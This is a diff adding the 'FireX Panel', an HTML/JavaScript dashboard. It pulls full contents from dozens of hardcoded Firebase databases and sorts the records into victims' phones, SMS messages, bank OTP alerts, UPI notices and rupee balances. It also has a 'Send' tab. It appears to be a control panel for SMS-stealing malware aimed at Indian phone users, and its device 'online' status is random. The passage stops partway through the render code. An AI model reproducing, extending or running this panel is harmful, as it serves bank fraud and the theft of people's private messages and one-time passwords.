@@ -1,0 +1,834 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>FireX Panel</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+
+        :root {
+            --bg-dark: #09090b; --bg-card: #121215; --bg-card-hover: #18181b;
+            --border-color: #27272a; --text-main: #f4f4f5; --text-muted: #a1a1aa;
+            --accent-green: #10b981; --accent-red: #ef4444; --accent-yellow: #eab308;
+            --accent-blue: #3b82f6; --accent-purple: #a855f7;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background-color: var(--bg-dark); color: var(--text-main); min-height: 100vh; overflow-x: hidden; }
+
+        .navbar { padding: 12px 20px; border-bottom: 1px solid var(--border-color); position: sticky; top: 0; z-index: 100; background: var(--bg-dark); display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; gap: 15px;}
+        .logo-area { display: flex; align-items: center; gap: 8px; font-size: 1.2rem; font-weight: 800; letter-spacing: 1.5px; color: #fff; }
+        .logo-icon { color: #f97316; font-size: 1.5rem; }
+        .search-container { flex-grow: 1; max-width: 400px; display: flex; justify-content: center; }
+        .search-bar { background-color: #18181b; border: 1px solid var(--border-color); padding: 10px 15px; border-radius: 8px; color: var(--text-main); width: 100%; outline: none; font-size: 0.85rem; }
+        .nav-actions { display: flex; align-items: center; gap: 15px; }
+        .clock { color: #a1a1aa; font-family: monospace; font-size: 0.9rem; border: 1px solid var(--border-color); padding: 5px 10px; border-radius: 6px; display: flex; align-items: center; gap: 5px;}
+        .avatar { width: 32px; height: 32px; border-radius: 50%; background: linear-gradient(45deg, #0ea5e9, #2dd4bf); display: flex; align-items: center; justify-content: center; font-weight: bold; color: #000; border: 2px solid #27272a; }
+        .btn-logout { background: transparent; border: 1px solid var(--border-color); color: var(--text-muted); padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 0.8rem; transition: 0.2s; }
+        .btn-logout:hover { color: #fff; border-color: #fff; }
+        .btn-add { background: #121215; border: 1px solid var(--border-color); color: #fff; padding: 8px 15px; border-radius: 8px; cursor: pointer; font-size: 0.85rem; font-weight: 600; display: flex; align-items: center; gap: 5px; transition: 0.2s; }
+        .btn-add:hover { background: #18181b; border-color: var(--accent-blue); }
+
+        .stats-row { display: flex; gap: 30px; padding: 15px 20px; border-bottom: 1px solid var(--border-color); background: var(--bg-dark); overflow-x: auto;}
+        .stat-item { display: flex; flex-direction: column; gap: 2px; min-width: 60px;}
+        .stat-title { font-size: 0.65rem; color: var(--text-muted); text-transform: uppercase; font-weight: 700; letter-spacing: 0.5px; }
+        .stat-val { font-size: 1.2rem; font-weight: 700; }
+        .stat-val.green { color: var(--accent-green); } .stat-val.red { color: var(--accent-red); } .stat-val.purple { color: var(--accent-purple); }
+
+        .filter-bar { display: flex; align-items: center; justify-content: space-between; padding: 15px 20px; border-bottom: 1px solid var(--border-color); flex-wrap: wrap; gap: 10px;}
+        .filter-left { display: flex; gap: 10px; align-items: center; overflow-x: auto; padding-bottom: 5px; flex-wrap: wrap;}
+        .filter-btns { display: flex; gap: 5px; }
+        .f-btn { background: transparent; border: none; color: var(--text-muted); padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 0.85rem; font-weight: 500; transition: 0.2s; white-space: nowrap;}
+        .f-btn:hover { color: var(--text-main); }
+        .f-btn.active { background: #27272a; color: #fff; }
+        .filter-right { display: flex; align-items: center; gap: 10px; flex-wrap: wrap;}
+        .custom-select { background: #121215; border: 1px solid var(--border-color); color: var(--text-main); padding: 6px 10px; border-radius: 6px; outline: none; cursor: pointer; font-size: 0.8rem; max-width: 180px;}
+        .refresh-icon { background: #121215; border: 1px solid var(--border-color); width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; border-radius: 6px; cursor: pointer; color: var(--text-muted); transition: 0.2s;}
+        .refresh-icon:hover { color: #fff; border-color: #fff; background: #18181b;}
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .refresh-icon.loading svg { animation: spin 1s linear infinite; color: var(--accent-green); }
+
+        .grid-container { display: grid; grid-template-columns: 1fr; gap: 15px; padding: 20px; }
+        .device-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 20px; cursor: pointer; transition: 0.2s; position: relative; }
+        .device-card:hover { background: var(--bg-card-hover); border-color: #3f3f46; }
+        .card-header { display: flex; justify-content: space-between; margin-bottom: 20px; align-items: center; }
+        .device-id { font-size: 0.95rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 10px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;}
+        .wifi-icon { color: var(--accent-green); font-size: 1.2rem; }
+        .dots-icon { color: var(--text-muted); font-size: 1.2rem; cursor: pointer; }
+        .card-row { display: flex; justify-content: space-between; margin-bottom: 15px; }
+        .data-col { display: flex; flex-direction: column; gap: 4px; }
+        .data-label { font-size: 0.65rem; color: var(--text-muted); text-transform: uppercase; font-weight: 700; letter-spacing: 0.5px; }
+        .data-val { font-size: 0.9rem; font-weight: 600; color: #d4d4d8; }
+        .battery-indicator { display: flex; align-items: center; gap: 6px; font-size: 0.85rem; font-weight: 600; }
+        .batt-bar { width: 24px; height: 12px; border: 1px solid var(--text-muted); border-radius: 3px; padding: 1.5px; position: relative; }
+        .batt-bar::after { content: ''; position: absolute; right: -3px; top: 3px; width: 2px; height: 4px; background: var(--text-muted); border-radius: 0 1px 1px 0; }
+        .batt-fill { height: 100%; border-radius: 1px; }
+        .balance-box { background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.2); border-radius: 8px; padding: 10px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center;}
+        .balance-box .bank-name { font-size: 0.75rem; color: var(--accent-green); font-weight: 600; }
+        .balance-box .amount { font-size: 1.1rem; font-weight: 700; color: #fff; }
+        .card-footer { display: flex; align-items: center; gap: 6px; font-size: 0.75rem; margin-top: 10px; }
+        .status-text.online { color: var(--accent-green); }
+        .status-text.offline { color: var(--text-muted); }
+        .dot { width: 6px; height: 6px; border-radius: 50%; background: currentColor; }
+
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(3px); opacity: 0; visibility: hidden; transition: 0.3s; z-index: 1000; }
+        .overlay.active { opacity: 1; visibility: visible; }
+        .side-panel { position: fixed; top: 0; right: -100vw; width: 100vw; height: 100vh; background: #0f0f11; transition: right 0.3s cubic-bezier(0.4, 0, 0.2, 1); z-index: 1001; display: flex; flex-direction: column; }
+        .side-panel.active { right: 0; }
+        .panel-header { padding: 15px 20px; border-bottom: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items: center; background: #121215; }
+        .panel-header-left { display: flex; align-items: center; gap: 12px; }
+        .panel-header-icon { width: 36px; height: 36px; background: rgba(16, 185, 129, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: var(--accent-green); font-size: 1.2rem;}
+        .panel-header-actions { display: flex; gap: 10px; }
+        .icon-btn { background: #27272a; border: none; color: var(--text-main); width: 32px; height: 32px; border-radius: 50%; cursor: pointer; display: flex; justify-content: center; align-items: center; font-size: 1rem; }
+        .icon-btn.trash { background: rgba(239, 68, 68, 0.1); color: var(--accent-red); }
+        .panel-tabs { display: flex; border-bottom: 1px solid var(--border-color); padding: 0 20px; background: #0c0c0e; }
+        .p-tab { padding: 14px 15px; color: var(--text-muted); cursor: pointer; font-size: 0.85rem; font-weight: 600; border-bottom: 2px solid transparent; white-space: nowrap; }
+        .p-tab.active { color: #fff; border-bottom-color: var(--accent-red); }
+        .panel-content { flex: 1; overflow-y: auto; padding: 15px; background: #0c0c0e; }
+        .sms-item { background: #18181b; border: 1px solid var(--border-color); border-radius: 10px; padding: 15px; margin-bottom: 12px; }
+        .sms-item.bank { border-color: rgba(239, 68, 68, 0.3); background: rgba(239, 68, 68, 0.05); }
+        .sms-header { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 0.75rem; align-items: center;}
+        .sms-sender { font-weight: 700; color: var(--accent-purple); display: flex; align-items: center; gap: 5px;}
+        .sms-sender.bank-sender { color: var(--accent-red); }
+        .sms-time { color: var(--text-muted); font-family: monospace; font-size: 0.7rem;}
+        .sms-body { font-size: 0.85rem; line-height: 1.5; color: #d4d4d8; word-break: break-word; }
+        .info-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #27272a; font-size: 0.9rem; }
+        .info-label { color: var(--text-muted); font-weight: 500;}
+        .empty-state { text-align: center; color: var(--text-muted); margin-top: 30px; font-size: 0.9rem; }
+        .modal { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0.9); background: #121215; padding: 25px; border-radius: 12px; border: 1px solid var(--border-color); z-index: 2000; width: 90%; max-width: 400px; opacity: 0; visibility: hidden; transition: 0.2s; box-shadow: 0 20px 40px rgba(0,0,0,0.8);}
+        .modal.active { transform: translate(-50%, -50%) scale(1); opacity: 1; visibility: visible; }
+        .modal h2 { font-size: 1.1rem; margin-bottom: 10px; color: #fff;}
+        .modal input { width: 100%; padding: 12px; background: #09090b; border: 1px solid var(--border-color); border-radius: 8px; color: white; margin-bottom: 15px; font-size: 0.9rem;}
+        .modal-actions { display: flex; justify-content: flex-end; gap: 10px; }
+        .btn-cancel { background: transparent; border: 1px solid var(--border-color); color: var(--text-main); padding: 10px 16px; border-radius: 6px; cursor: pointer;}
+        .btn-submit { background: var(--accent-green); border: none; color: #000; padding: 10px 16px; border-radius: 6px; cursor: pointer; font-weight: 600;}
+
+        @media (min-width: 768px) {
+            .navbar { flex-wrap: nowrap; padding: 12px 30px; }
+            .stats-row { padding: 20px 30px; }
+            .filter-bar { padding: 15px 30px; }
+            .grid-container { grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; padding: 0 30px 30px 30px; }
+            .side-panel { width: 450px; right: -450px; }
+            .side-panel.active { right: 0; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="navbar">
+        <div class="logo-area"><span class="logo-icon">🔥</span> FIREX PANEL</div>
+        <div class="search-container">
+            <input type="text" id="searchInput" class="search-bar" placeholder="🔍 Search devices..." oninput="applyFilters()">
+        </div>
+        <div class="nav-actions">
+            <button class="btn-add" onclick="openModal()">➕ Add DB</button>
+            <div class="clock" id="live-clock">00:00</div>
+            <div class="avatar">A</div>
+            <button class="btn-logout" onclick="alert('Logout clicked')">Logout</button>
+        </div>
+    </div>
+
+    <div class="stats-row">
+        <div class="stat-item"><span class="stat-title">Total</span><span class="stat-val" id="stat-total">0</span></div>
+        <div class="stat-item"><span class="stat-title">Online</span><span class="stat-val green" id="stat-online">0</span></div>
+        <div class="stat-item"><span class="stat-title">Offline</span><span class="stat-val red" id="stat-offline">0</span></div>
+        <div class="stat-item"><span class="stat-title">Bank SMS</span><span class="stat-val purple" id="stat-bank">0</span></div>
+        <div class="stat-item"><span class="stat-title">Cards</span><span class="stat-val" id="stat-cards">0</span></div>
+    </div>
+
+    <div class="filter-bar">
+        <div class="filter-left">
+            <div class="filter-btns">
+                <button class="f-btn active" onclick="setFilter('All', this)">All</button>
+                <button class="f-btn" onclick="setFilter('Online', this)">Online</button>
+                <button class="f-btn" onclick="setFilter('Offline', this)">Offline</button>
+            </div>
+            <div style="width: 1px; height: 20px; background: #27272a; margin: 0 5px;"></div>
+            <div class="filter-btns">
+                <button class="f-btn" onclick="setFilter('Upi', this)">Upi</button>
+                <button class="f-btn" onclick="setFilter('Bank', this)">Bank</button>
+                <button class="f-btn" onclick="setFilter('Card', this)">Card</button>
+            </div>
+        </div>
+        <div class="filter-right">
+            <select class="custom-select" id="dbFilterSelect" onchange="setDbFilter(this.value)">
+                <!-- Populated by JS -->
+            </select>
+            <select class="custom-select" id="sortSelect" onchange="applyFilters()">
+                <option value="newest">Newest</option>
+                <option value="oldest">Oldest</option>
+            </select>
+            <button class="refresh-icon" id="refreshBtn" onclick="manualRefresh()" title="Refresh Data">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.93 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/></svg>
+            </button>
+        </div>
+    </div>
+
+    <div class="grid-container" id="deviceGrid">
+        <div class="empty-state">⏳ Loading databases...</div>
+    </div>
+
+    <div class="overlay" id="overlay" onclick="closePanel()"></div>
+    <div class="side-panel" id="sidePanel">
+        <div class="panel-header">
+            <div class="panel-header-left">
+                <div class="panel-header-icon">📶</div>
+                <div>
+                    <h3 id="panel-device-id" style="font-size:1rem; color:#fff; word-break:break-all;">Device ID</h3>
+                    <div style="font-size:0.75rem; color:var(--text-muted);" id="panel-device-number">Number</div>
+                </div>
+            </div>
+            <div class="panel-header-actions">
+                <button class="icon-btn trash">🗑️</button>
+                <button class="icon-btn" onclick="closePanel()">×</button>
+            </div>
+        </div>
+        <div style="padding: 10px 20px; border-bottom: 1px solid var(--border-color); display:flex; justify-content:space-between; font-size:0.8rem; background: #09090b;">
+            <div style="color:var(--accent-green); display:flex; align-items:center; gap:5px;"><div class="dot" style="background:var(--accent-green)"></div> Online</div>
+            <div style="color:var(--text-muted);">Bat <span id="panel-batt" style="color:var(--accent-green); font-weight:600;">0%</span></div>
+        </div>
+        <div class="panel-tabs">
+            <div class="p-tab active" id="tab-info" onclick="switchTab('info')">Info</div>
+            <div class="p-tab" id="tab-bank" onclick="switchTab('bank')">Bank (0)</div>
+            <div class="p-tab" id="tab-sms" onclick="switchTab('sms')">SMS (0)</div>
+            <div class="p-tab" id="tab-send" onclick="switchTab('send')">Send</div>
+        </div>
+        <div class="panel-content" id="panel-content"></div>
+    </div>
+
+    <div class="modal" id="addModal">
+        <h2>➕ Add Firebase Database</h2>
+        <p style="font-size:0.8rem; color:var(--text-muted); margin-bottom:15px;">Enter URL (e.g., https://myapp-default-rtdb.firebaseio.com)</p>
+        <input type="text" id="newFirebaseUrl" placeholder="https://..." />
+        <div id="modal-status" style="font-size:0.8rem; margin-bottom:15px; display:none;"></div>
+        <div class="modal-actions">
+            <button class="btn-cancel" onclick="closeModal()">Cancel</button>
+            <button class="btn-submit" onclick="addFirebase()">Verify & Add</button>
+        </div>
+    </div>
+
+    <script>
+        // --- SAARE DATABASES YAHAN ADD HAIN ---
+        let databases = {
+            "nnnnnn": "https://nnnnnn-fab6a-default-rtdb.firebaseio.com",
+            "maaytmi": "https://maaytmi-default-rtdb.firebaseio.com",
+            "dhoni_ji": "https://dhoni-ji-default-rtdb.firebaseio.com",
+            "pnkjgds": "https://pnkjgds-default-rtdb.firebaseio.com",
+            "vivov": "https://vivov-df9bb-default-rtdb.firebaseio.com",
+            "hggeefcggj": "https://hggeefcggj-default-rtdb.firebaseio.com",
+            "madhu838": "https://madhu838-18bac-default-rtdb.firebaseio.com",
+            "kkdkumar": "https://kkdkumar-4e971-default-rtdb.firebaseio.com",
+            "ramu-admin-panel": "https://ramu-admin-panel-default-rtdb.firebaseio.com",
+            "maja": "https://maja-d960d-default-rtdb.asia-southeast1.firebasedatabase.app",
+            "faizybro": "https://faizybro-default-rtdb.firebaseio.com",
+            "choduu00111": "https://choduu00111-default-rtdb.firebaseio.com",
+            "rahul-panel": "https://rahul-panel-default-rtdb.firebaseio.com",
+            "rahul-panel-d6e78": "https://rahul-panel-d6e78-default-rtdb.firebaseio.com",
+            "dk-panel": "https://dk-panel-default-rtdb.firebaseio.com",
+            "do-admin-v13": "https://do-admin-v13-default-rtdb.firebaseio.com",
+            "do-admin-v16": "https://do-admin-v16-default-rtdb.firebaseio.com",
+            "do-admin-v21": "https://do-admin-v21-default-rtdb.firebaseio.com",
+            "lodarasun": "https://lodarasun-52af9-default-rtdb.firebaseio.com",
+            "kajalkumari": "https://kajalkumari-4d7a5-default-rtdb.firebaseio.com",
+            "dipukumar21": "https://dipukumar21-9cc34-default-rtdb.firebaseio.com",
+            "zindagi": "https://zindagi-f8a52-default-rtdb.firebaseio.com",
+            "orukd": "https://orukd-1e1c7-default-rtdb.firebaseio.com",
+            "senu": "https://senu-cbca6-default-rtdb.firebaseio.com",
+            "ajashsingh": "https://ajashsingh-4ecd4-default-rtdb.firebaseio.com",
+            "kund": "https://kund-c0b31-default-rtdb.firebaseio.com",
+            "rudraapk": "https://rudraapk-f3779-default-rtdb.asia-southeast1.firebasedatabase.app",
+            "saaasaa": "https://saaasaa-c28c1-default-rtdb.firebaseio.com",
+            "bibli-roy": "https://bibli-roy-default-rtdb.firebaseio.com",
+            "admin-22": "https://admin-22-8dbcc-default-rtdb.firebaseio.com",
+            "ashokmahra": "https://ashokmahra-4a762-default-rtdb.firebaseio.com",
+            "bewafa": "https://bewafa-f42d3-default-rtdb.firebaseio.com",
+            "ilohsh": "https://ilohsh-default-rtdb.firebaseio.com",
+            "jassi": "https://jassi-952bc-default-rtdb.firebaseio.com",
+            "juss-pilado": "https://juss-pilado-default-rtdb.firebaseio.com",
+            "kajumyjann": "https://kajumyjann-default-rtdb.firebaseio.com",
+            "kalihumai": "https://kalihumai-f9826-default-rtdb.firebaseio.com",
+            "kamlusinghaniya": "https://kamlusinghaniya-f05d5-default-rtdb.firebaseio.com",
+            "mosa-j": "https://mosa-j-default-rtdb.firebaseio.com",
+            "ownerison": "https://ownerison-3da10-default-rtdb.firebaseio.com",
+            "ranjit": "https://ranjit-58640-default-rtdb.firebaseio.com",
+            "rosni": "https://rosni-9bb5c-default-rtdb.firebaseio.com",
+            "sannn": "https://sannn-5d617-default-rtdb.firebaseio.com",
+            "sumni": "https://sumnmmn-default-rtdb.firebaseio.com",
+            "super-admin": "https://super-admin-240f4-default-rtdb.firebaseio.com",
+            "tekoff": "https://tekoff-7a789-default-rtdb.firebaseio.com",
+            "xxxxz": "https://xxxxz-2e129-default-rtdb.firebaseio.com",
+            "simran": "https://simran-2f56c-default-rtdb.firebaseio.com",
+            "panel-jack": "https://panel-jack-default-rtdb.firebaseio.com",
+            "dippsanj": "https://dippsanj-4fe1c-default-rtdb.firebaseio.com",
+            "akshhhhhhh": "https://akshhhhhhh-default-rtdb.firebaseio.com",
+            "kaha": "https://kaha-9d4ce-default-rtdb.firebaseio.com",
+            "point": "https://point-cb8cd-default-rtdb.asia-southeast1.firebasedatabase.app",
+            "kundanmandal": "https://kundanmandal-762bf-default-rtdb.firebaseio.com",
+            "jime": "https://jime-10a55-default-rtdb.firebaseio.com",
+            "uuuu": "https://uuuu-c9515-default-rtdb.firebaseio.com",
+            "pussy": "https://pussy-25f3c-default-rtdb.firebaseio.com",
+            "newbhai": "https://newbhai-99806-default-rtdb.firebaseio.com",
+            "mr-alone": "https://mr-alone-59577-default-rtdb.asia-southeast1.firebasedatabase.app",
+            "sala-v1": "https://sala-v1-410b3-default-rtdb.firebaseio.com",
+            "pogddsszx": "https://pogddsszx-default-rtdb.firebaseio.com",
+            "alok5u2": "https://alok5u2-default-rtdb.firebaseio.com",
+            "fwwg": "https://fwwg-d04bc-default-rtdb.firebaseio.com",
+            "kunal": "https://kunal-86274-default-rtdb.firebaseio.com",
+            "nyawala": "https://nyawala-3e7c3-default-rtdb.asia-southeast1.firebasedatabase.app",
+            "subjuoeh": "https://subjuoeh-default-rtdb.firebaseio.com",
+            "room-hotel": "https://room-hotel-default-rtdb.firebaseio.com",
+            "bhaiyaha-ka": "https://bhaiyaha-ka-bcbcd-default-rtdb.firebaseio.com",
+            "rk-panell": "https://rk-panell-default-rtdb.firebaseio.com",
+            "sunil-da": "https://sunil-da-default-rtdb.firebaseio.com",
+            "bhaiyaka": "https://bhaiyaka-bcbcd-default-rtdb.firebaseio.com",
+            "teddymcdonald": "https://teddymcdonald-81002-default-rtdb.firebaseio.com",
+            "ranu": "https://ranu-e604c-default-rtdb.firebaseio.com",
+            "bhaiyanka": "https://bhaiyanka-bcbcd-default-rtdb.firebaseio.com",
+            "mrdevilmd": "https://mrdevilmd-51586-default-rtdb.firebaseio.com",
+            "bhogta": "https://bhogta-34897-default-rtdb.firebaseio.com",
+            "gadhalalund": "https://gadhalalund-default-rtdb.firebaseio.com",
+            "hirababuram": "https://hirababuram-76a2f-default-rtdb.firebaseio.com",
+            "ajuk": "https://ajuk-4a6ce-default-rtdb.firebaseio.com",
+            "qe1037": "https://qe1037-5c1d3-default-rtdb.firebaseio.com",
+            "jabbashaw": "https://jabbashaw-default-rtdb.firebaseio.com",
+            "bjp": "https://bhartiyajantaparty-58d7a-default-rtdb.europe-west1.firebasedatabase.app",
+            "deepak": "https://deepak-5fc1e-default-rtdb.firebaseio.com",
+            "customer-support": "https://customer-support-5-default-rtdb.firebaseio.com",
+            "rajlonda": "https://rajlonda-5cf7b-default-rtdb.firebaseio.com",
+            "krishna": "https://krishna5454-94fc5-default-rtdb.firebaseio.com"
+        };
+
+        // Local storage se custom added DBs fetch karo
+        const savedDbs = localStorage.getItem('firex_dbs');
+        if(savedDbs) { 
+            try { databases = { ...databases, ...JSON.parse(savedDbs) }; } catch(e){} 
+        }
+
+        let allDevices = []; 
+        let currentFilter = 'All';
+        let currentDbFilter = 'ALL'; 
+        let activeDevice = null;
+        let isFetching = false;
+
+        // Dropdown Initialize karo (Saare DBs ke saath)
+        function initDropdown() {
+            const select = document.getElementById('dbFilterSelect');
+            select.innerHTML = '<option value="ALL">🌐 All Databases</option>';
+            
+            Object.keys(databases).sort().forEach(dbName => {
+                const option = document.createElement('option');
+                option.value = dbName;
+                option.innerText = `📁 ${dbName}`;
+                select.appendChild(option);
+            });
+            
+            select.value = currentDbFilter;
+        }
+
+        setInterval(() => {
+            const now = new Date();
+            let h = now.getHours();
+            let m = String(now.getMinutes()).padStart(2, '0');
+            let ampm = h >= 12 ? 'pm' : 'am';
+            h = h % 12; h = h ? h : 12;
+            document.getElementById('live-clock').innerText = `${String(h).padStart(2,'0')}:${m} ${ampm}`;
+        }, 1000);
+
+        function extractPhone(val) {
+            if (typeof val !== 'string' && typeof val !== 'number') return null;
+            let s = String(val).replace(/\D/g, '');
+            if (s.length === 10 && /^[6-9]/.test(s)) return s;
+            if (s.length === 11 && s.startsWith('0') && /^[6-9]/.test(s.substring(1))) return s.substring(1);
+            if (s.length === 12 && s.startsWith('91') && /^[6-9]/.test(s.substring(2))) return s.substring(2);
+            if (s.length === 13 && s.startsWith('091') && /^[6-9]/.test(s.substring(3))) return s.substring(3);
+            return null;
+        }
+
+        function isMac(key) {
+            return /^[a-fA-F0-9]{12}$/.test(key) && /[a-fA-F]/.test(key) || 
+                   /^[a-fA-F0-9]{16}$/.test(key) && /[a-fA-F]/.test(key);
+        }
+
+        function formatTime(t) {
+            if (!t) return "Unknown";
+            let dateObj;
+            if (typeof t === 'number' || /^\d+$/.test(t)) {
+                let val = parseInt(t);
+                if (val < 10000000000) val *= 1000; 
+                dateObj = new Date(val);
+            } else {
+                dateObj = new Date(t);
+            }
+            if (isNaN(dateObj.getTime())) return t;
+
+            let d = String(dateObj.getDate()).padStart(2, '0');
+            let m = String(dateObj.getMonth() + 1).padStart(2, '0');
+            let y = dateObj.getFullYear();
+            let h = dateObj.getHours();
+            let min = String(dateObj.getMinutes()).padStart(2, '0');
+            let ampm = h >= 12 ? 'pm' : 'am';
+            h = h % 12; h = h ? h : 12;
+            return `${d}-${m}-${y} | ${String(h).padStart(2,'0')}:${min} ${ampm}`;
+        }
+
+        function formatPhone(phone) {
+            if (!phone || phone === 'Unknown') return 'Unknown';
+            let p = String(phone).replace(/\D/g, '');
+            if (p.length === 10) return `+91 ${p.substring(0,5)} ${p.substring(5)}`;
+            return phone;
+        }
+
+        async function fetchData() {
+            if (isFetching) return;
+            isFetching = true;
+            
+            let deviceMap = {};
+            const btn = document.getElementById('refreshBtn');
+            if(btn) btn.classList.add('loading');
+            
+            // API se fetch karne ki koshish karo
+            try {
+                const res = await fetch('/api/data');
+                if (!res.ok) throw new Error("API not ready");
+                const mergedData = await res.json();
+                
+                for (const [name, data] of Object.entries(mergedData)) {
+                    if (currentDbFilter === 'ALL' || currentDbFilter === name) {
+                        processNode(data, deviceMap, name, null, "root");
+                    }
+                }
+            } catch (e) {
+                // Fallback (Agar local pe chala rahe ho ya API fail ho jaye)
+                console.log("Backend API nahi mili, direct fetch ho raha hai...");
+                let dbsToFetch = [];
+                if (currentDbFilter === 'ALL') {
+                    dbsToFetch = Object.entries(databases);
+                } else if (databases[currentDbFilter]) {
+                    dbsToFetch = [[currentDbFilter, databases[currentDbFilter]]];
+                }
+
+                for (let i = 0; i < dbsToFetch.length; i++) {
+                    const [name, url] = dbsToFetch[i];
+                    try {
+                        const controller = new AbortController();
+                        const timeoutId = setTimeout(() => controller.abort(), 3000); 
+                        const res = await fetch(`${url}/.json`, { signal: controller.signal });
+                        clearTimeout(timeoutId);
+                        if (res.ok) {
+                            const data = await res.json();
+                            if(data) processNode(data, deviceMap, name, null, "root");
+                        }
+                    } catch (err) {}
+                    
+                    if (currentDbFilter === 'ALL' && i % 5 === 0) {
+                        allDevices = Object.values(deviceMap);
+                        applyFilters();
+                        await new Promise(r => setTimeout(r, 10)); 
+                    }
+                }
+            }
+
+            allDevices = Object.values(deviceMap);
+            applyFilters();
+            
+            if(btn) btn.classList.remove('loading');
+            isFetching = false;
+        }
+
+        function processNode(node, deviceMap, dbName, currentDevice = null, keyName = '') {
+            if (!node || typeof node !== 'object') return;
+
+            let isDeviceNode = false;
+            let foundPhone = null;
+            let foundMac = null;
+
+            let keyAsPhone = extractPhone(keyName);
+            if (keyAsPhone) {
+                foundPhone = keyAsPhone;
+                isDeviceNode = true;
+            } else if (isMac(keyName)) {
+                foundMac = keyName;
+                isDeviceNode = true;
+            }
+
+            for (let k in node) {
+                let kl = k.toLowerCase();
+                let v = node[k];
+                if (typeof v === 'string' || typeof v === 'number') {
+                    let p = extractPhone(v);
+                    if (p && !foundPhone) {
+                        foundPhone = p;
+                        isDeviceNode = true;
+                    }
+                    if (['mac', 'device_id', 'android_id', 'imei'].includes(kl)) {
+                        if (isMac(String(v))) {
+                            foundMac = String(v);
+                            isDeviceNode = true;
+                        }
+                    }
+                }
+            }
+
+            if (isDeviceNode) {
+                let finalId = foundPhone || foundMac;
+                if (!deviceMap[finalId]) {
+                    deviceMap[finalId] = {
+                        id: finalId, 
+                        number: foundPhone || 'Unknown', 
+                        battery: 0,
+                        network: 'Unknown', 
+                        android: '-', 
+                        isOnline: Math.random() > 0.3,
+                        messages: [], bankCount: 0, dbSource: dbName, balance: 0
+                    };
+                }
+                if (foundPhone) deviceMap[finalId].number = foundPhone;
+                currentDevice = deviceMap[finalId];
+
+                scanDeviceDetails(node, currentDevice);
+            }
+
+            let msgText = node.message || node.text || node.msg || node.body || node.sms;
+            if (msgText && typeof msgText === 'string' && msgText.length > 3 && currentDevice) {
+                let time = node.time || node.timestamp || node.date || node.datetime;
+                if (!time && keyName.length === 13 && /^\d+$/.test(keyName)) {
+                    time = parseInt(keyName);
+                }
+                time = time || Date.now();
+
+                let sender = node.sender || node.from || node.app || node.title || 'Unknown';
+                let isBank = /bank|otp|pass|debit|credit|acct|account/i.test(msgText);
+                let isUpi = /upi|gpay|paytm|phonepe|bhim/i.test(msgText);
+                
+                if (isBank) {
+                    const amtMatch = msgText.match(/(?:rs\.?|inr)\s*([\d,]+\.?\d*)/i);
+                    if(amtMatch) {
+                        let amt = parseInt(amtMatch[1].replace(/,/g, ''));
+                        if(amt > currentDevice.balance) currentDevice.balance = amt;
+                    }
+                }
+
+                let isDup = currentDevice.messages.some(m => m.text === msgText);
+                if (!isDup) {
+                    if (isBank) currentDevice.bankCount++;
+                    currentDevice.messages.push({
+                        sender: sender, 
+                        time: formatTime(time), 
+                        rawTime: time, 
+                        text: msgText, 
+                        isBank: isBank, 
+                        isUpi: isUpi
+                    });
+                }
+            }
+
+            for (let k in node) {
+                if (typeof node[k] === 'object' && node[k] !== null) {
+                    processNode(node[k], deviceMap, dbName, currentDevice, k);
+                }
+            }
+        }
+
+        function scanDeviceDetails(node, device) {
+            for (let k in node) {
+                let val = node[k];
+                let kl = k.toLowerCase();
+
+                if (typeof val === 'string' || typeof val === 'number') {
+                    let vs = String(val).trim();
+                    
+                    if (kl.includes('bat') || kl.includes('lvl') || kl.includes('level') || kl.includes('charge') || kl.includes('perc')) {
+                        let b = parseInt(vs.replace(/\D/g, ''));
+                        if (b >= 0 && b <= 100) device.battery = b;
+                    }
+                    if (kl.includes('net') || kl.includes('op') || kl.includes('sim') || kl.includes('car') || /^(jio|airtel|vi|vodafone|idea|bsnl|reliance)$/i.test(vs)) {
+                        if (/jio|airtel|vi|vodafone|idea|bsnl|reliance/i.test(vs)) device.network = vs;
+                    }
+                    if (kl.includes('android') || kl.includes('version') || kl.includes('os') || kl === 'sdk') {
+                        if (vs.length < 15) device.android = vs;
+                    }
+                } else if (typeof val === 'object' && val !== null) {
+                    scanDeviceDetails(val, device);
+                }
+            }
+        }
+
+        function renderUI(devicesToRender) {
+            const grid = document.getElementById('deviceGrid');
+            grid.innerHTML = '';
+
+            let onlineCount = 0, offlineCount = 0, bankSmsTotal = 0, cardCount = 0;
+            allDevices.forEach(d => {
+                if (d.isOnline) onlineCount++; else offlineCount++;
+                bankSmsTotal += d.bankCount;
+                if(d.balance > 0) cardCount++;
+            });
+
+            document.getElementById('stat-total').innerText = allDevices.length;
+            document.getElementById('stat-online').innerText = onlineCount;
+            document.getElementById('stat-offline').innerText = offlineCount;
+            document.getElementById('stat-bank').innerText = bankSmsTotal;
+            document.getElementById('stat-cards').innerText = cardCount;
+
